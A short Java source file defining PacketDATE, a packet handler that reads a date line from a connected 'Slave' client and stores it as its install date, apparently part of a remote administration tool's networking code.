package com.redpois0n.packets.in;

import java.io.DataInputStream;

import com.redpois0n.Slave;

public class PacketDATE extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String date = slave.readLine();
		slave.setInstallDate(date);
	}

}
